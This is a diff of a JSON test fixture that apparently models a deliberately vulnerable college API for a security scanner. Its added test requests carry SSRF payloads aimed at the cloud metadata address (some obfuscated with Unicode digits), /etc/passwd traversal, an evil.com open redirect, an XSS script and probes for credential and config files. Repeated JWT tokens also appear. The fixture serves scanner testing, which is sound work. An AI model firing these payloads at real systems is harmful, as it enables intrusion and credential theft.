@@ -259,10 +259,7 @@
         "testData": {
             "method": "GET",
             "url": "/api/college/about-us/.circleci/config.yml",
-            "responsePayload": {
-                "version": "5.1.5",
-                "jobs": "job1.. job2 .. job 3"
-            },
+            "responsePayload": "version: 1.0\njobs:\n  - name: build\n    steps:\n      - run: echo 'Building...'\n",
             "responseHeaders": {},
             "statusCode": 200
         }
@@ -281,11 +278,8 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/employee/config.json",
-            "responsePayload": {
-                "api_keys": "guebebeuybhjjjkkkshcbb",
-                "server": "notebook.com"
-            },
+            "url": "api/college/employee/config.json",
+            "responsePayload": "{\"api_keys\":{\"key1\":\"value1\",\"key2\":\"value2\"}}",
             "responseHeaders": {},
             "statusCode": 200
         }
@@ -516,7 +510,7 @@
         "testData": {
             "method": "GET",
             "url": "/api/college/mech-dept/.git-credentials",
-            "responsePayload": "https://github.com/openai/gpt-3.5",
+            "responsePayload": "https://user:pass@github.com",
             "responseHeaders": {
                 "Content-Type": "application/json"
             },
@@ -538,7 +532,7 @@
         "testData": {
             "method": "GET",
             "url": "/api/college/civil-dept/.github/workflows/main.yml",
-            "responsePayload": "{\"on\":\"push\",\"jobs\":{\"build\":{\"steps\":[{\"uses\":\"actions/checkout@v2\"},{\"run\":\"echo 'Hello, world!'\"}]}}}",
+            "responsePayload": "- \"uses\": Some value here - \"on\": ubuntu-latest - \"jobs\": build - \"steps\": - run: echo \"Hello, world!\" - run: npm install - \"on\": windows-latest - \"uses\": actions\/checkout@v2 - \"steps\": - run: echo \"Windows workflow\" - \"steps\": - run: echo \"Step 1\" - run: echo \"Step 2\"",
             "responseHeaders": {},
             "statusCode": 200
         }
@@ -580,7 +574,7 @@
         "testData": {
             "method": "GET",
             "url": "/api/college/chem-dept/.env.production.local",
-            "responsePayload": "APP_NAME=MyApp\nDB_HOST=localhost\nDB_PASSWORD=secretpassword\n",
+            "responsePayload": "APP_NAME=MyAppAPP_ENV=productionAPP_KEY=abc123DEBUG=trueDB_HOST=localhostDB_PASSWORD=secure_passwordDB_DATABASE=my_databaseURL=https://example.comDB_PORT=3306",
             "responseHeaders": {},
             "statusCode": 200
         }
@@ -969,7 +963,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/society/debate/\"></script><script>alert(document.domain)</script>",
+            "url": "/api/college/society/debate",
             "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to debate society. Play is <script>alert(document.domain)</script></p> </body> </html>",
             "responseHeaders": {},
             "statusCode": 200
@@ -1000,7 +994,7 @@
         "sampleData": {
             "method": "GET",
             "requestPayload": "",
-            "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to CS department.</p> </body> </html>",
+            "responsePayload": "{\"department\" : \"cs\"}",
             "requestHeaders": "{\"Access-Token\":\"JWT eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoibG9naW4iLCJzaWduZWRVcCI6InRydWUiLCJ1c2VybmFtZSI6InJpc2hhdi5zb2xhbmtpQGFrdG8uaW8iLCJpYXQiOjE2ODg3MTMzNTUsImV4cCI6MTY4ODcxNDI1NX0.ToSrgQdEWaTVBphY9QMPBmo1zWgaDt_2zRlFb4gLYcgn3x58ClnTciRXN--9 LeoKojWo466S2rDDK8KH3IhR7gTDKk9ihKfLaVoKIg7M7RaHxFgp-vtjWenFcR6IBqLXqYh_kCqBFDH3hjrbD1Qtoaieu_L1rtJFwqz2xoIZP0VEmTPXT4vxT6yoVlbgloROzu1cJFGnoFQm69OUNHpCLf9S_7Qs-9eV2V-AlzeClfMnblTqhQP_s4znPit2Ik0ypNIH-mEwgxL-coWVmphuFYy5uG5c2Z4F4te7r_QP9jlOVYFjwB6_9gQSwi1lrm8qKdNml1UKnh4NNizc1878oQ\",\"Content-Type\": \"application/json\", \"HOST\": \"vulnerableapi.com\", \"cookie\": \"refreshToken=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoicmVmcmVzaFRva2VuIiwic2lnbmVkVXAiOiJ0cnVlIiwidXNlcm5hbWUiOiJhdm5lZXNoQGFrdG8uaW8iLCJpYXQiOjE2ODk2OTg0MDgsImV4cCI6MTY5MDIxNjgwOH0.i4YOfDCn4W3weTYqU5M3zaB37L4DHRUaFc91XVzD0_WOYRlTETrzFyLRpMETP7GrttSE79DyFDIN9nVgtuiAOrcLafyZUZsbV9oqLaNxEHx3vcyOQpg7Br7AUPxzqnIyZs_vxdmnkewRoxaeMifhlXuhIvORCoLZRHBgLX66CuJNqBwQy6zO3W0DcdgFN0DOWeQulYN2m8KLuNVDzHswq0s9jOWLPEwVBwlQc-wvN1PThvrPNpKNMSA4ptWOds6tqphBs0RYyaE4S_HFywT8mmMb8mer7fdzFqTEXfyKFzEFbI2M9k2_kpASyd6uvl_Cdk22QSIZBzjRMVo3VOLWgg; intercom-device-id-xjvl0z2h=25750e91-1931-42e2-a319-8b7289df6800\"}",
             "responseHeaders": "",
             "status": "OK",
@@ -1010,7 +1004,7 @@
         "testData": {
             "method": "GET",
             "url": "/api/college/department/cs",
-            "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to CS department.</p> </body> </html>",
+            "responsePayload": {"department" : "cs"},
             "responseHeaders": {},
             "statusCode": 200
         }
@@ -1020,7 +1014,7 @@
         "sampleData": {
             "method": "GET",
             "requestPayload": "",
-            "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to CS department.</p> </body> </html>",
+            "responsePayload": "{\"department\" : \"mech\"}",
             "requestHeaders": "{\"Access-Token\":\"JWT eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoibG9naW4iLCJzaWduZWRVcCI6InRydWUiLCJ1c2VybmFtZSI6InJpc2hhdi5zb2xhbmtpQGFrdG8uaW8iLCJpYXQiOjE2ODg3MTMzNTUsImV4cCI6MTY4ODcxNDI1NX0.ToSrgQdEWaTVBphY9QMPBmo1zWgaDt_2zRlFb4gLYcgn3x58ClnTciRXN--9 LeoKojWo466S2rDDK8KH3IhR7gTDKk9ihKfLaVoKIg7M7RaHxFgp-vtjWenFcR6IBqLXqYh_kCqBFDH3hjrbD1Qtoaieu_L1rtJFwqz2xoIZP0VEmTPXT4vxT6yoVlbgloROzu1cJFGnoFQm69OUNHpCLf9S_7Qs-9eV2V-AlzeClfMnblTqhQP_s4znPit2Ik0ypNIH-mEwgxL-coWVmphuFYy5uG5c2Z4F4te7r_QP9jlOVYFjwB6_9gQSwi1lrm8qKdNml1UKnh4NNizc1878oQ\",\"Content-Type\": \"application/json\", \"HOST\": \"vulnerableapi.com\", \"cookie\": \"refreshToken=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoicmVmcmVzaFRva2VuIiwic2lnbmVkVXAiOiJ0cnVlIiwidXNlcm5hbWUiOiJhdm5lZXNoQGFrdG8uaW8iLCJpYXQiOjE2ODk2OTg0MDgsImV4cCI6MTY5MDIxNjgwOH0.i4YOfDCn4W3weTYqU5M3zaB37L4DHRUaFc91XVzD0_WOYRlTETrzFyLRpMETP7GrttSE79DyFDIN9nVgtuiAOrcLafyZUZsbV9oqLaNxEHx3vcyOQpg7Br7AUPxzqnIyZs_vxdmnkewRoxaeMifhlXuhIvORCoLZRHBgLX66CuJNqBwQy6zO3W0DcdgFN0DOWeQulYN2m8KLuNVDzHswq0s9jOWLPEwVBwlQc-wvN1PThvrPNpKNMSA4ptWOds6tqphBs0RYyaE4S_HFywT8mmMb8mer7fdzFqTEXfyKFzEFbI2M9k2_kpASyd6uvl_Cdk22QSIZBzjRMVo3VOLWgg; intercom-device-id-xjvl0z2h=25750e91-1931-42e2-a319-8b7289df6800\"}",
             "responseHeaders": "",
             "status": "OK",
@@ -1030,7 +1024,7 @@
         "testData": {
             "method": "GET",
             "url": "/api/college/department/mech",
-            "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to CS department.</p> </body> </html>",
+            "responsePayload": {"department" : "mech"},
             "responseHeaders": {},
             "statusCode": 200
         }
@@ -1040,7 +1034,7 @@
         "sampleData": {
             "method": "GET",
             "requestPayload": "",
-            "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to CS department.</p> </body> </html>",
+            "responsePayload": "{\"department\" : \"eni\"}",
             "requestHeaders": "{\"Access-Token\":\"JWT eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoibG9naW4iLCJzaWduZWRVcCI6InRydWUiLCJ1c2VybmFtZSI6InJpc2hhdi5zb2xhbmtpQGFrdG8uaW8iLCJpYXQiOjE2ODg3MTMzNTUsImV4cCI6MTY4ODcxNDI1NX0.ToSrgQdEWaTVBphY9QMPBmo1zWgaDt_2zRlFb4gLYcgn3x58ClnTciRXN--9 LeoKojWo466S2rDDK8KH3IhR7gTDKk9ihKfLaVoKIg7M7RaHxFgp-vtjWenFcR6IBqLXqYh_kCqBFDH3hjrbD1Qtoaieu_L1rtJFwqz2xoIZP0VEmTPXT4vxT6yoVlbgloROzu1cJFGnoFQm69OUNHpCLf9S_7Qs-9eV2V-AlzeClfMnblTqhQP_s4znPit2Ik0ypNIH-mEwgxL-coWVmphuFYy5uG5c2Z4F4te7r_QP9jlOVYFjwB6_9gQSwi1lrm8qKdNml1UKnh4NNizc1878oQ\",\"Content-Type\": \"application/json\", \"HOST\": \"vulnerableapi.com\", \"cookie\": \"refreshToken=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoicmVmcmVzaFRva2VuIiwic2lnbmVkVXAiOiJ0cnVlIiwidXNlcm5hbWUiOiJhdm5lZXNoQGFrdG8uaW8iLCJpYXQiOjE2ODk2OTg0MDgsImV4cCI6MTY5MDIxNjgwOH0.i4YOfDCn4W3weTYqU5M3zaB37L4DHRUaFc91XVzD0_WOYRlTETrzFyLRpMETP7GrttSE79DyFDIN9nVgtuiAOrcLafyZUZsbV9oqLaNxEHx3vcyOQpg7Br7AUPxzqnIyZs_vxdmnkewRoxaeMifhlXuhIvORCoLZRHBgLX66CuJNqBwQy6zO3W0DcdgFN0DOWeQulYN2m8KLuNVDzHswq0s9jOWLPEwVBwlQc-wvN1PThvrPNpKNMSA4ptWOds6tqphBs0RYyaE4S_HFywT8mmMb8mer7fdzFqTEXfyKFzEFbI2M9k2_kpASyd6uvl_Cdk22QSIZBzjRMVo3VOLWgg; intercom-device-id-xjvl0z2h=25750e91-1931-42e2-a319-8b7289df6800\"}",
             "responseHeaders": "",
             "status": "OK",
@@ -1050,7 +1044,7 @@
         "testData": {
             "method": "GET",
             "url": "/api/college/department/eni",
-            "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to CS department.</p> </body> </html>",
+            "responsePayload": {"department" : "eni"},
             "responseHeaders": {},
             "statusCode": 200
         }
@@ -1060,7 +1054,7 @@
         "sampleData": {
             "method": "GET",
             "requestPayload": "",
-            "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to CS department.</p> </body> </html>",
+            "responsePayload": "{\"department\" : \"civil\"}",
             "requestHeaders": "{\"Access-Token\":\"JWT eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoibG9naW4iLCJzaWduZWRVcCI6InRydWUiLCJ1c2VybmFtZSI6InJpc2hhdi5zb2xhbmtpQGFrdG8uaW8iLCJpYXQiOjE2ODg3MTMzNTUsImV4cCI6MTY4ODcxNDI1NX0.ToSrgQdEWaTVBphY9QMPBmo1zWgaDt_2zRlFb4gLYcgn3x58ClnTciRXN--9 LeoKojWo466S2rDDK8KH3IhR7gTDKk9ihKfLaVoKIg7M7RaHxFgp-vtjWenFcR6IBqLXqYh_kCqBFDH3hjrbD1Qtoaieu_L1rtJFwqz2xoIZP0VEmTPXT4vxT6yoVlbgloROzu1cJFGnoFQm69OUNHpCLf9S_7Qs-9eV2V-AlzeClfMnblTqhQP_s4znPit2Ik0ypNIH-mEwgxL-coWVmphuFYy5uG5c2Z4F4te7r_QP9jlOVYFjwB6_9gQSwi1lrm8qKdNml1UKnh4NNizc1878oQ\",\"Content-Type\": \"application/json\", \"HOST\": \"vulnerableapi.com\", \"cookie\": \"refreshToken=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoicmVmcmVzaFRva2VuIiwic2lnbmVkVXAiOiJ0cnVlIiwidXNlcm5hbWUiOiJhdm5lZXNoQGFrdG8uaW8iLCJpYXQiOjE2ODk2OTg0MDgsImV4cCI6MTY5MDIxNjgwOH0.i4YOfDCn4W3weTYqU5M3zaB37L4DHRUaFc91XVzD0_WOYRlTETrzFyLRpMETP7GrttSE79DyFDIN9nVgtuiAOrcLafyZUZsbV9oqLaNxEHx3vcyOQpg7Br7AUPxzqnIyZs_vxdmnkewRoxaeMifhlXuhIvORCoLZRHBgLX66CuJNqBwQy6zO3W0DcdgFN0DOWeQulYN2m8KLuNVDzHswq0s9jOWLPEwVBwlQc-wvN1PThvrPNpKNMSA4ptWOds6tqphBs0RYyaE4S_HFywT8mmMb8mer7fdzFqTEXfyKFzEFbI2M9k2_kpASyd6uvl_Cdk22QSIZBzjRMVo3VOLWgg; intercom-device-id-xjvl0z2h=25750e91-1931-42e2-a319-8b7289df6800\"}",
             "responseHeaders": "",
             "status": "OK",
@@ -1070,7 +1064,7 @@
         "testData": {
             "method": "GET",
             "url": "/api/college/department/civil",
-            "responsePayload": "<!DOCTYPE html> <html> <head> </head> <body> <h1>Hello, API user!</h1> <p>Welcome to CS department.</p> </body> </html>",
+            "responsePayload": {"department" : "civil"},
             "responseHeaders": {},
             "statusCode": 200
         }
@@ -1209,7 +1203,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/exams/it/has been changed to https://www.fakewebsite.com. so please visit https://www.fakewebsite.com as your requested link",
+            "url": "/api/college/exams/it/has%20been%20changed%20to%20https%3A%2F%2Fwww.fakewebsite.com.%20so%20please%20visit%20https%3A%2F%2Fwww.fakewebsite.com%20as%20your%20requested%20link",
             "responsePayload": "Page not found. The page has been changed to https://www.fakewebsite.com. so please visit https://www.fakewebsite.com as your requested link",
             "responseHeaders": {},
             "statusCode": 200
@@ -1260,7 +1254,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/user/results/view/sem4",
+            "url": "/api/college/user/results/view/sem4?user=3245",
             "responsePayload": {
                 "user_id": 3245,
                 "name": "user21",
@@ -1293,7 +1287,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/users/profile",
+            "url": "/api/college/users/profile?private_var=101",
             "responsePayload": {
                 "private_var": 101,
                 "name": "admin-1",
@@ -1433,7 +1427,7 @@
         },
         "testData": {
             "method": "POST",
-            "url": "/api/college/sem1/enroll-course",
+            "url": "/api/college/sem1/enroll-course?csrf=NRZ1M9Q4Yotd-mV7MyzwQNiiMCDLjd-RRLUWzV4A",
             "responsePayload": {
                 "message": "Course enrollment successful"
             },
@@ -1477,7 +1471,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/info/deptartments/hod",
+            "url": "/api/college/info/deptartments/hod?limit=10",
             "responsePayload": {
                 "CSE": "PROF-404",
                 "ECE": "PROF-414",
@@ -1508,7 +1502,7 @@
         },
         "testData": {
             "method": "PATCH",
-            "url": "/api/college/student/profile",
+            "url": "/api/college/student/profile?account=98765432",
             "responsePayload": {
                 "message": "Profile updated successfully",
                 "account": "98765432"
@@ -1531,7 +1525,7 @@
         },
         "testData": {
             "method": "POST",
-            "url": "/api/college/user",
+            "url": "/api/college/user?role=admin",
             "responsePayload": {
                 "message": "User created successfully",
                 "role": "admin"
@@ -1600,7 +1594,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/redirect",
+            "url": "api/college/redirect?url=https://evil.com/?p=https://college.com",
             "responsePayload": {
                 "message": "Welcome to the Evil home page"
             },
@@ -1718,7 +1712,7 @@
         },
         "testData": {
             "method": "POST",
-            "url": "/api/college/upload-file",
+            "url": "/api/college/upload-file?file=testInvalidFile",
             "responsePayload": {
                 "status": 404,
                 "message": "Access denied",
@@ -1826,29 +1820,13 @@
             "method": "GET",
             "url": "/api/college/course-list",
             "responsePayload": {
-                "courses": [
-                    {
-                        "courseId": "CS101",
-                        "name": "Computer Science",
-                        "duration": "4 years",
-                        "faculty": "PROF-404",
-                        "description": "This course provides in-depth knowledge of computer science principles and applications."
-                    },
-                    {
-                        "courseId": "ENG201",
-                        "name": "English",
-                        "duration": "3 years",
-                        "faculty": "PROF-202",
-                        "description": "Explore the world of literature and develop critical thinking and analytical skills."
-                    },
-                    {
-                        "courseId": "MAT301",
-                        "name": "Mathematics",
-                        "duration": "3 years",
-                        "faculty": "PROF-505",
-                        "description": "Study advanced mathematical concepts and their real-world applications."
-                    }
-                ]
+                "courses":{
+                    "courseId_1": "CS101",
+                    "courseId_2": "CS102",
+                    "courseId_3": "CS103",
+                    "courseId_4": "CS104",
+                    "courseId_5": "CS105"
+                }
             },
             "responseHeaders": {
                 "Server": "Apache/2.4.18 (Ubuntu)"
@@ -1996,11 +1974,11 @@
             "responseHeaders": "",
             "status": "OK",
             "statusCode": "200",
-            "path": "api/college/prof/upload-marks?file=marks.csv"
+            "path": "/api/college/prof/upload-marks?file=marks.csv"
         },
         "testData": {
             "method": "POST",
-            "url": "/api/college/prof/upload-marks",
+            "url": "api/college/prof/upload-marks?file=https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv",
             "responsePayload": {
                 "ami-id": "ami-871423645",
                 "ami-launch-index": 3
@@ -2019,11 +1997,11 @@
             "responseHeaders": "",
             "status": "OK",
             "statusCode": "200",
-            "path": "api/college/dashboard/upload-profilePic?imageFile=profile_pic.jpg"
+            "path": "/api/college/dashboard/upload-profilePic?imageFile=profile_pic.jpg"
         },
         "testData": {
             "method": "POST",
-            "url": "/api/college/dashboard/upload-profilePic",
+            "url": "api/college/dashboard/upload-profilePic?imageFile=https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg",
             "responsePayload": {
                 "ami-id": "ami-236871445",
                 "ami-launch-index": 2
@@ -2042,11 +2020,11 @@
             "responseHeaders": "",
             "status": "OK",
             "statusCode": "200",
-            "path": "api/college/dept/chemical/resources/books?book=book1.pdf"
+            "path": "/api/college/dept/chemical/resources/books?book=book1.pdf"
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/dept/chemical/resources/books",
+            "url": "api/college/dept/chemical/resources/books?book=https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf",
             "responsePayload": {
                 "ami-id": "ami-287144365",
                 "ami-launch-index": 1
@@ -2069,7 +2047,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/library/homepage",
+            "url": "/api/college/library/homepage?redirect=http://make-127-0-0-1-rr.1u.ms/admin",
             "responsePayload": {
                 "role": "admin",
                 "message": "Welcome Admin",
@@ -2094,7 +2072,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/library/depart/cse",
+            "url": "/api/college/library/depart/cse?redirect=http://localhost/admin",
             "responsePayload": {
                 "role": "admin",
                 "message": "Welcome HOD of CSE Department",
@@ -2115,11 +2093,11 @@
             "responseHeaders": "",
             "status": "OK",
             "statusCode": "200",
-            "path": "api/college/depart/mech/prof/upload-data?file=data.xml"
+            "path": "/api/college/depart/mech/prof/upload-data?file=data.xml"
         },
         "testData": {
             "method": "POST",
-            "url": "/api/college/depart/mech/prof/upload-data",
+            "url": "api/college/depart/mech/prof/upload-data?file=https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml",
             "responsePayload": {
                 "ami-id": "ami-234456871",
                 "ami-launch-index": 7
@@ -2142,7 +2120,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/library/depart/books/eee",
+            "url": "/api/college/library/depart/books/eee?redirect=http://①②⑦。⓪⓪⓪。⓪⓪①/admin",
             "responsePayload": {
                 "role": "admin",
                 "message": "Welcome HOD of EEE Department",
@@ -2167,7 +2145,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/library/depart/books/chem",
+            "url": "/api/college/library/depart/books/chem?redirect=http://169.254.169.254/latest/meta-data/local-ipv4",
             "responsePayload": {
                 "ami-id": "ami-287144365",
                 "ami-launch-index": 1
@@ -2186,11 +2164,11 @@
             "responseHeaders": "",
             "status": "OK",
             "statusCode": "200",
-            "path": "api/college/dept/mech/resources/books-and-journals?file=book1.pdf"
+            "path": "/api/college/dept/mech/resources/books-and-journals?file=book1.pdf"
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/dept/mech/resources/books-and-journals",
+            "url": "api/college/dept/mech/resources/books-and-journals?file=///etc/passwd",
             "responsePayload": "root:x:0:0:root:/root:/bin/bash",
             "responseHeaders": {},
             "statusCode": 200
@@ -2210,7 +2188,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/library/depart/journals/mech",
+            "url": "/api/college/library/depart/journals/mech?redirect=http://⑯⑨。②⑤④。⑯⑨｡②⑤④/latest/meta-data/local-ipv4",
             "responsePayload": {
                 "ami-id": "ami-234468711",
                 "ami-launch-index": 4
@@ -2498,24 +2476,11 @@
             "url": "/api/college/campus-info/actuator/beans",
             "responsePayload": {
                 "type": "application",
-                "beans": [
-                    {
-                        "name": "bean1",
-                        "dependencies": [
-                            "dependency1",
-                            "dependency2"
-                        ],
-                        "scope": "singleton"
-                    },
-                    {
-                        "name": "bean2",
-                        "dependencies": [
-                            "dependency3",
-                            "dependency4"
-                        ],
-                        "scope": "prototype"
-                    }
-                ]
+                "beans": {
+                    "name": "bean1",
+                    "dependencies": "dependency1",
+                    "scope": "singleton"
+                }
             },
             "responseHeaders": {},
             "statusCode": 200
@@ -2538,16 +2503,8 @@
             "url": "/api/college/info/about/campus/actuator/configprops",
             "responsePayload": {
                 "contexts": {
-                    "org.springframework.boot.actuate": {
-                        "beans": {
-                            "bean1": {
-                                "properties": {
-                                    "property1": "value1",
-                                    "property2": "value2"
-                                }
-                            }
-                        }
-                    }
+                    "org.springframework.boot.actuate": "beans",
+                    "beans":"properties"
                 }
             },
             "responseHeaders": {},
@@ -2594,19 +2551,17 @@
             "responseHeaders": "{\"Content-Type\":\"application/json\"}",
             "status": "OK",
             "statusCode": "200",
-            "path": "api/college/info/depart/branch"
+            "path": "/api/college/info/depart/branch"
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/info/depart/branch/actuator/httptrace",
+            "url": "api/college/info/depart/branch/actuator/httptrace",
             "responsePayload": {
-                "traces": [
-                    {
-                        "timestamp": "2023-07-06T10:30:15.123Z",
-                        "principal": "user123",
-                        "session": "session123"
-                    }
-                ]
+                "traces":{
+                    "timestamp": "2023-07-06T10:30:15.123Z",
+                    "principal": "user123",
+                    "session": "session123"
+                }
             },
             "responseHeaders": {},
             "statusCode": 200
@@ -2628,17 +2583,12 @@
             "method": "GET",
             "url": "/api/college/about/depart/branch/actuator/threaddump",
             "responsePayload": {
-                "threads": [
-                    {
-                        "threadName": "Thread-1",
-                        "threadId": "12345",
-                        "threadState": "RUNNABLE",
-                        "stackTrace": [
-                            "at com.example.MyClass.method1(MyClass.java:10)",
-                            "at com.example.MyClass.method2(MyClass.java:20)"
-                        ]
-                    }
-                ]
+                "threads":{
+                    "threadName": "Thread-1",
+                    "threadId": "12345",
+                    "threadState": "RUNNABLE",
+                    "stackTrace": "at com.example.MyClass.method1(MyClass.java:10)"
+                }
             },
             "responseHeaders": {},
             "statusCode": 200
@@ -2658,7 +2608,7 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/info/student-101",
+            "url": "/api/college/info/student-101?debug=xml",
             "responsePayload": "<debug><message>Error occurred in processing request</message><struts.actionMapping>Action Mapping: com.example.StudentAction</struts.actionMapping><stackTrace>at com.example.StudentAction.execute(StudentAction.java:123)\nat org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:431)</stackTrace></debug>",
             "responseHeaders": {
                 "Content-Type": "application/xml"
@@ -2680,11 +2630,71 @@
         },
         "testData": {
             "method": "GET",
-            "url": "/api/college/info/department/branch/struts/webconsole.html",
+            "url": "api/college/info/department/branch/struts/webconsole.html?debug=console",
             "responsePayload": "<html>\n<head>\n  <title>Struts OGNL Console</title>\n</head>\n<body>\n  <h1>Welcome to the OGNL console!</h1>\n</body>\n</html>",
             "responseHeaders": {
                 "Content-Type": "text/html"
             },
+            "statusCode": 200
+        }
+    },
+    {
+        "id": "JWT_SIGNING_IN_CLIENT_SIDE",
+        "sampleData": {
+            "method": "GET",
+            "requestPayload": "",
+            "responsePayload": "const token = jwt.sign({ username: 'john_doe' }, 'your_secret_key');",
+            "requestHeaders": "{\"Access-Token\":\"JWT eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoibG9naW4iLCJzaWduZWRVcCI6InRydWUiLCJ1c2VybmFtZSI6InJpc2hhdi5zb2xhbmtpQGFrdG8uaW8iLCJpYXQiOjE2ODg3MTMzNTUsImV4cCI6MTY4ODcxNDI1NX0.ToSrgQdEWaTVBphY9QMPBmo1zWgaDt_2zRlFb4gLYcgn3x58ClnTciRXN--9 LeoKojWo466S2rDDK8KH3IhR7gTDKk9ihKfLaVoKIg7M7RaHxFgp-vtjWenFcR6IBqLXqYh_kCqBFDH3hjrbD1Qtoaieu_L1rtJFwqz2xoIZP0VEmTPXT4vxT6yoVlbgloROzu1cJFGnoFQm69OUNHpCLf9S_7Qs-9eV2V-AlzeClfMnblTqhQP_s4znPit2Ik0ypNIH-mEwgxL-coWVmphuFYy5uG5c2Z4F4te7r_QP9jlOVYFjwB6_9gQSwi1lrm8qKdNml1UKnh4NNizc1878oQ\",\"Content-Type\":\"application/json\",\"HOST\":\"vulnerableapi.com\"}",
+            "responseHeaders": "",
+            "status": "OK",
+            "statusCode": "200",
+            "path": "/api/college/chat/verify"
+        },
+        "testData": {
+            "method": "GET",
+            "url": "/api/college/chat/verify",
+            "responsePayload": "const token = jwt.sign({ username: 'john_doe' }, 'your_secret_key');",
+            "responseHeaders": {},
+            "statusCode": 200
+        }
+    },
+    {
+        "id": "PORT_SCANNING",
+        "sampleData": {
+            "method": "GET",
+            "requestPayload": "",
+            "responsePayload": "Welcome to College Events!!",
+            "requestHeaders": "{\"Access-Token\":\"JWT eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoibG9naW4iLCJzaWduZWRVcCI6InRydWUiLCJ1c2VybmFtZSI6InJpc2hhdi5zb2xhbmtpQGFrdG8uaW8iLCJpYXQiOjE2ODg3MTMzNTUsImV4cCI6MTY4ODcxNDI1NX0.ToSrgQdEWaTVBphY9QMPBmo1zWgaDt_2zRlFb4gLYcgn3x58ClnTciRXN--9 LeoKojWo466S2rDDK8KH3IhR7gTDKk9ihKfLaVoKIg7M7RaHxFgp-vtjWenFcR6IBqLXqYh_kCqBFDH3hjrbD1Qtoaieu_L1rtJFwqz2xoIZP0VEmTPXT4vxT6yoVlbgloROzu1cJFGnoFQm69OUNHpCLf9S_7Qs-9eV2V-AlzeClfMnblTqhQP_s4znPit2Ik0ypNIH-mEwgxL-coWVmphuFYy5uG5c2Z4F4te7r_QP9jlOVYFjwB6_9gQSwi1lrm8qKdNml1UKnh4NNizc1878oQ\",\"Content-Type\":\"application/json\",\"HOST\":\"vulnerableapi.com\"}",
+            "responseHeaders": "",
+            "status": "OK",
+            "statusCode": "200",
+            "path": "/api/college/events?lookup=http://events-1.com"
+        },
+        "testData": {
+            "method": "GET",
+            "url": "/api/college/events?lookup=http://localhost:80",
+            "responsePayload": "Connection to MongoDB refused due to timeout, status=rejected",
+            "responseHeaders": {},
+            "statusCode": 204
+        }
+    },
+    {
+        "id": "FETCH_SENSITIVE_FILES",
+        "sampleData": {
+            "method": "GET",
+            "requestPayload": "",
+            "responsePayload": "20 available networks for students ,connect to any using roll no as user id and phone number as password",
+            "requestHeaders": "{\"Access-Token\":\"JWT eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBa3RvIiwic3ViIjoibG9naW4iLCJzaWduZWRVcCI6InRydWUiLCJ1c2VybmFtZSI6InJpc2hhdi5zb2xhbmtpQGFrdG8uaW8iLCJpYXQiOjE2ODg3MTMzNTUsImV4cCI6MTY4ODcxNDI1NX0.ToSrgQdEWaTVBphY9QMPBmo1zWgaDt_2zRlFb4gLYcgn3x58ClnTciRXN--9 LeoKojWo466S2rDDK8KH3IhR7gTDKk9ihKfLaVoKIg7M7RaHxFgp-vtjWenFcR6IBqLXqYh_kCqBFDH3hjrbD1Qtoaieu_L1rtJFwqz2xoIZP0VEmTPXT4vxT6yoVlbgloROzu1cJFGnoFQm69OUNHpCLf9S_7Qs-9eV2V-AlzeClfMnblTqhQP_s4znPit2Ik0ypNIH-mEwgxL-coWVmphuFYy5uG5c2Z4F4te7r_QP9jlOVYFjwB6_9gQSwi1lrm8qKdNml1UKnh4NNizc1878oQ\",\"Content-Type\":\"application/json\",\"HOST\":\"vulnerableapi.com\"}",
+            "responseHeaders": "",
+            "status": "OK",
+            "statusCode": "200",
+            "path": "/api/college/network-info?view=http://net.com"
+        },
+        "testData": {
+            "method": "GET",
+            "url": "/api/college/network-info?view=/etc/passwd",
+            "responsePayload": "Sensitive Info ....",
+            "responseHeaders": {},
             "statusCode": 200
         }
     }
